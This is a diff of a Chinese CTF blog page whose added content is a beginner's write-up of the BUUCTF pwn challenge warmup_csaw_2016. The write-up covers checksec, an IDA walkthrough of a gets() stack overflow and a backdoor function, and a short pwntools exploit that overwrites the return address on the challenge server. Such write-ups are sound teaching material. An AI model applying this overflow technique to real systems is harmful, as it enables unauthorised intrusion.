@@ -22,26 +22,40 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"lmarch2.github.com","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="A Student studying Cybersecurity">
-<meta property="og:type" content="website">
-<meta property="og:title" content="lmarch2&#39;blog">
-<meta property="og:url" content="http://lmarch2.github.com/archives/2023/index.html">
+    <meta name="description" content="T3 warmup_csaw_2016 2023-01-06WPBUUCTF pwn第三题考点：栈溢出，与上题类似">
+<meta property="og:type" content="article">
+<meta property="og:title" content="week1 T3">
+<meta property="og:url" content="http://lmarch2.github.com/posts/bd3fdc75/index.html">
 <meta property="og:site_name" content="lmarch2&#39;blog">
-<meta property="og:description" content="A Student studying Cybersecurity">
+<meta property="og:description" content="T3 warmup_csaw_2016 2023-01-06WPBUUCTF pwn第三题考点：栈溢出，与上题类似">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-fb4d58181e235c94561577b2c4af38dc_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-19fc3d1ed197677ec860d87f4d328756_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-a9342c39cccfcb08151c10e52d33d7f8_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-8439007eace8a199836ffba7ed7ae65e_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-f6878b5ead1b0c9e36cf46e11b1b73c2_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-ea795c3163730c1428cdeb16c15eabfc_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-78a46c31edfbcab05ff353e3e624996a_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-feaba2ae58e8a0cf0161837933d1fe29_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-244c60af51681873d600771f879d5c00_1440w.webp">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-e3375ccc43536a0178b679606bfaa1eb_1440w.webp">
+<meta property="article:published_time" content="2023-01-13T13:02:17.000Z">
+<meta property="article:modified_time" content="2023-01-13T13:37:49.909Z">
 <meta property="article:author" content="lmarch2">
 <meta property="article:tag" content="ctf">
+<meta property="article:tag" content="BUUCTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-fb4d58181e235c94561577b2c4af38dc_1440w.webp">
 
 
-<link rel="canonical" href="http://lmarch2.github.com/archives/2023/">
+<link rel="canonical" href="http://lmarch2.github.com/posts/bd3fdc75/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"archives/2023/index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/bd3fdc75/","path":"posts/bd3fdc75/","title":"week1 T3"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>归档 | lmarch2'blog</title>
+<title>week1 T3 | lmarch2'blog</title>
   
 
 
@@ -74,7 +88,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <h1 class="site-title">lmarch2'blog</h1>
+      <p class="site-title">lmarch2'blog</p>
       <i class="logo-line"></i>
     </a>
       <p class="site-subtitle" itemprop="description">求知若渴，大智若愚</p>
@@ -128,7 +142,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -141,6 +155,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T3-warmup-csaw-2016"><span class="nav-text">T3 warmup_csaw_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-checksec"><span class="nav-text">0x01 checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-IDA"><span class="nav-text">0x02 IDA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-exp"><span class="nav-text">0x03 exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-thinking"><span class="nav-text">0x04 thinking</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -258,229 +273,288 @@
 
     </div>
 
-    <div class="main-inner archive posts-collapse">
+    <div class="main-inner post posts-expand">
 
 
   
-  
-  
-  <div class="post-block">
-    <div class="post-content">
-      <div class="collection-title">
-        <span class="collection-header">嗯..! 目前共计 10 篇日志。 继续努力。</span>
-      </div>
 
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/bd3fdc75/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-ffbdad5d2f9183a625a6a112a4f96b02_1440w.webp">
+      <meta itemprop="name" content="lmarch2">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lmarch2'blog">
+      <meta itemprop="description" content="A Student studying Cybersecurity">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="week1 T3 | lmarch2'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          week1 T3
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
       
-    <div class="collection-year">
-      <span class="collection-header">2023</span>
+
+      <time title="创建时间：2023-01-13 21:02:17 / 修改时间：21:37:49" itemprop="dateCreated datePublished" datetime="2023-01-13T21:02:17+08:00">2023-01-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>770</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="T3-warmup-csaw-2016"><a href="#T3-warmup-csaw-2016" class="headerlink" title="T3 warmup_csaw_2016"></a>T3 warmup_csaw_2016</h2><blockquote>
+<p>2023-01-06WP<br>BUUCTF pwn第三题<br>考点：栈溢出，与上题类似</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>下载文件，没有开启任何保护（看大佬博客里说按经验这种情况一般就是栈溢出了）<br><img data-src="https://pic1.zhimg.com/80/v2-fb4d58181e235c94561577b2c4af38dc_1440w.webp"></p>
+<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>f5反汇编，main函数里有一个gets()函数<br><img data-src="https://pic3.zhimg.com/80/v2-19fc3d1ed197677ec860d87f4d328756_1440w.webp"><br>看到返回一个gets()函数，可利用栈溢出<br><del>但是这个两个参数的gets函数没有看懂……</del><br><del>那个write和sprintf函数也没看懂……</del><br>shift+f12调出string window 查看字符串，虽然没有&#x2F;bin&#x2F;sh，但是找到了一个cat flag.txt，应该可以利用<br><img data-src="https://pic1.zhimg.com/80/v2-a9342c39cccfcb08151c10e52d33d7f8_1440w.webp"><br>双击cat flag.txt进去看看，X一下发现是在sub_40060D函数里，反汇编再看一下发现我们想要的system（）就在这，若能调用它的话就能直接命令抓取flag了呀<br><img data-src="https://pic3.zhimg.com/80/v2-8439007eace8a199836ffba7ed7ae65e_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-f6878b5ead1b0c9e36cf46e11b1b73c2_1440w.webp"><br>接下来就是记下sub_40060D函数的地址0x40060D,并将其作为溢出的返回地址（也可以记把偏移量压入寄存器那条汇编指令处的地址0x40011）<br><img data-src="https://pic1.zhimg.com/80/v2-ea795c3163730c1428cdeb16c15eabfc_1440w.webp"><br>又因为要gets的v5的大小为0x40h，所以与返回地址的距离是0x40+8（rbp的长度）<br><img data-src="https://pic3.zhimg.com/80/v2-78a46c31edfbcab05ff353e3e624996a_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-feaba2ae58e8a0cf0161837933d1fe29_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-244c60af51681873d600771f879d5c00_1440w.webp"></p>
+<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>写出exploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25916)</span><br><span class="line">payload=&#x27;a&#x27;*(0x40+8)+p64(0x400611)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到flag<br><img data-src="https://pic4.zhimg.com/80/v2-e3375ccc43536a0178b679606bfaa1eb_1440w.webp"></p>
+<h3 id="0x04-thinking"><a href="#0x04-thinking" class="headerlink" title="0x04 thinking"></a>0x04 thinking</h3><p>这题跟上一题一样，都是栈溢出，都是将某个后门函数的地址覆盖掉返回地址<br>一开始没反应过来cat flag.txt可以直接用，还在那找&#x2F;bin&#x2F;sh,<br>还是对信息不太敏感……<br>不过对栈的相关知识的学习还是让人感觉有收获的</p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-01-13T21:03:38+08:00"
-              content="2023-01-13">
-          01-13
-        </time>
-      </div>
+    
+    
+    
 
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/46e9d6ae/" itemprop="url">
-            <span itemprop="name">week2 T5</span>
-          </a>
-      </div>
+<div> 
+	 
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------文章就到这里啦！<i class="fa fa-paw"></i>感谢您的阅读XD-------------</div>
+    
+</div> 
+	 
+</div>
 
-      
-    </header>
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>lmarch2
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://lmarch2.github.com/posts/bd3fdc75/" title="week1 T3">http://lmarch2.github.com/posts/bd3fdc75/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+
+ <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+              <a href="/tags/BUUCTF/" rel="tag"><i class="fa fa-tag"></i> BUUCTF</a>
+          </div>
+          <script type="text/javascript">
+            var tagsall=document.getElementsByClassName("post-tags")
+            for (var i = tagsall.length - 1; i >= 0; i--){
+                var tags=tagsall[i].getElementsByTagName("a");
+                for (var j = tags.length - 1; j >= 0; j--) {
+                    var golden_ratio = 0.618033988749895;
+                    var s = 0.5;
+                    var v = 0.999;
+                    var h = golden_ratio + Math.random()*0.8 - 0.5;
+                    var h_i = parseInt(h * 6);
+                    var f = h * 6 - h_i;
+                    var p = v * (1 - s);
+                    var q = v * (1 - f * s);
+                    var t = v * (1 - (1 - f) * s);
+                    var r, g, b;
+                    switch (h_i) {
+                        case 0:
+                            r = v;
+                            g = t;
+                            b = p;
+                            break;
+                        case 1:
+                            r = q;
+                            g = v;
+                            b = p;
+                            break;
+                        case 2:
+                            r = p;
+                            g = v;
+                            b = t;
+                            break;
+                        case 3 :
+                            r = p;
+                            g = q;
+                            b = v;
+                            break;
+                        case 4:
+                            r = t;
+                            g = p;
+                            b = v;
+                            break;
+                        case 5:
+                            r = v;
+                            g = p;
+                            b = q;
+                            break;
+                        default:
+                            r = 1;
+                            g = 1;
+                            b = 1;
+                      }
+                    tags[j].style.background = "rgba("+parseInt(r*255)+","+parseInt(g*255)+","+parseInt(b*255)+","+0.5+")";
+                }
+            }                        
+            </script>
+
+
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+
+ <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+              <a href="/tags/BUUCTF/" rel="tag"><i class="fa fa-tag"></i> BUUCTF</a>
+          </div>
+          <script type="text/javascript">
+            var tagsall=document.getElementsByClassName("post-tags")
+            for (var i = tagsall.length - 1; i >= 0; i--){
+                var tags=tagsall[i].getElementsByTagName("a");
+                for (var j = tags.length - 1; j >= 0; j--) {
+                    var golden_ratio = 0.618033988749895;
+                    var s = 0.5;
+                    var v = 0.999;
+                    var h = golden_ratio + Math.random()*0.8 - 0.5;
+                    var h_i = parseInt(h * 6);
+                    var f = h * 6 - h_i;
+                    var p = v * (1 - s);
+                    var q = v * (1 - f * s);
+                    var t = v * (1 - (1 - f) * s);
+                    var r, g, b;
+                    switch (h_i) {
+                        case 0:
+                            r = v;
+                            g = t;
+                            b = p;
+                            break;
+                        case 1:
+                            r = q;
+                            g = v;
+                            b = p;
+                            break;
+                        case 2:
+                            r = p;
+                            g = v;
+                            b = t;
+                            break;
+                        case 3 :
+                            r = p;
+                            g = q;
+                            b = v;
+                            break;
+                        case 4:
+                            r = t;
+                            g = p;
+                            b = v;
+                            break;
+                        case 5:
+                            r = v;
+                            g = p;
+                            b = q;
+                            break;
+                        default:
+                            r = 1;
+                            g = 1;
+                            b = 1;
+                      }
+                    tags[j].style.background = "rgba("+parseInt(r*255)+","+parseInt(g*255)+","+parseInt(b*255)+","+0.5+")";
+                }
+            }                        
+            </script>
+
+
+              <a href="/tags/BUUCTF/" rel="tag"><i class="fa fa-tag"></i> BUUCTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/ca38ece3/" rel="prev" title="week1 T2">
+                  <i class="fa fa-chevron-left"></i> week1 T2
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/235b49d6/" rel="next" title="week1 T4">
+                  week1 T4 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
   </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-01-13T21:03:33+08:00"
-              content="2023-01-13">
-          01-13
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/31eee638/" itemprop="url">
-            <span itemprop="name">week2 T4</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-01-13T21:03:27+08:00"
-              content="2023-01-13">
-          01-13
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/af8a739b/" itemprop="url">
-            <span itemprop="name">week2 T3</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-01-13T21:03:21+08:00"
-              content="2023-01-13">
-          01-13
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/d88d430d/" itemprop="url">
-            <span itemprop="name">week2 T2</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-01-13T21:03:09+08:00"
-              content="2023-01-13">
-          01-13
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/418412b7/" itemprop="url">
-            <span itemprop="name">week2 T1</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-01-13T21:02:53+08:00"
-              content="2023-01-13">
-          01-13
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/545c7940/" itemprop="url">
-            <span itemprop="name">week1 T5</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-01-13T21:02:24+08:00"
-              content="2023-01-13">
-          01-13
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/235b49d6/" itemprop="url">
-            <span itemprop="name">week1 T4</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-01-13T21:02:17+08:00"
-              content="2023-01-13">
-          01-13
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/bd3fdc75/" itemprop="url">
-            <span itemprop="name">week1 T3</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-01-13T21:01:55+08:00"
-              content="2023-01-13">
-          01-13
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/ca38ece3/" itemprop="url">
-            <span itemprop="name">week1 T2</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-01-13T20:15:14+08:00"
-              content="2023-01-13">
-          01-13
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/5331bd59/" itemprop="url">
-            <span itemprop="name">week1 T1</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
+</div>
 
 
-    </div>
-  </div>
-  
-  
-  
+
+
+
 
 </div>
   </main>
